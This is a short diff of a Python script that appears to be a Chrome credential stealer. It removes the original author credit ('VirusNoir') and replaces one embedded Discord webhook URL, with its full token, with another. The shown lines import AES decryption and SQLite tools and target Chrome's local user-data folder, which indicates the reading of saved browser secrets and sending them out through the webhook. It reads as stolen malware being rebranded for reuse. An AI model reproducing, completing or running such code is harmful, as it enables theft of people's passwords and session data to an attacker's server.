@@ -1,4 +1,4 @@
-#Script By VirusNoir
+
 
 import os
 import sqlite3 
@@ -8,7 +8,7 @@ from base64 import b64decode
 from Crypto.Cipher import AES
 from shutil import copy2
 from discord_webhook import *
-webhook = https://discord.com/api/webhooks/1039537198023852122/w-RJsMhzncObcM2mMz5vgl87LBYXOFq_E48x6FFETBv-zDryvAfwYA923Uyb685IOTc3
+webhook = https://discord.com/api/webhooks/1040236504880001045/zjxD1XXt3ijl6gZhrgRT7pBb5GknRttTIU_JOq4BJo5820hlFkQcay523cKvRMgLN3w9
 local = os.getenv("LOCALAPPDATA") 
 google_paths = [
             local + '\\Google\\Chrome\\User Data\\Default',
